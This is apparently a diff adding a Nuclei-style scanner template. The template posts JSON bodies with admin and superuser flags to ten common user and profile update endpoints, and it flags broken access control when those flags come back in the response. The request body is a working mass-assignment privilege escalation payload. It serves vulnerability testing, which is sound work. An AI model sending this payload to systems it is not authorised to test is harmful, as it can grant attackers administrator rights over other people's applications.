@@ -1,0 +1,49 @@
+id: broken-access-control-privilege-params
+
+info:
+  name: Broken Access Control via Privilege Escalation Parameters
+  author: bugscanner
+  severity: high
+  description: |
+    Submits JSON bodies containing common privilege escalation parameters
+    (role, isAdmin, admin, user_type, is_superuser) to update/profile endpoints.
+    A finding is reported when the submitted privileged value is reflected back
+    in the response, indicating the server accepted and applied the parameter.
+  tags: custom,access-control,privilege-escalation,broken-auth,idor
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/user/update"
+      - "{{BaseURL}}/api/user"
+      - "{{BaseURL}}/api/profile"
+      - "{{BaseURL}}/api/me"
+      - "{{BaseURL}}/user/update"
+      - "{{BaseURL}}/user/settings"
+      - "{{BaseURL}}/account/update"
+      - "{{BaseURL}}/api/v1/user"
+      - "{{BaseURL}}/api/v1/profile"
+      - "{{BaseURL}}/api/v2/user"
+
+    headers:
+      Content-Type: application/json
+
+    body: '{"role":"admin","isAdmin":true,"admin":true,"privilege":"admin","user_type":"admin","is_superuser":true,"permissions":["admin","superuser"]}'
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: word
+        part: body
+        words:
+          - '"role":"admin"'
+          - '"isAdmin":true'
+          - '"admin":true'
+          - '"privilege":"admin"'
+          - '"user_type":"admin"'
+          - '"is_superuser":true'
+        condition: or
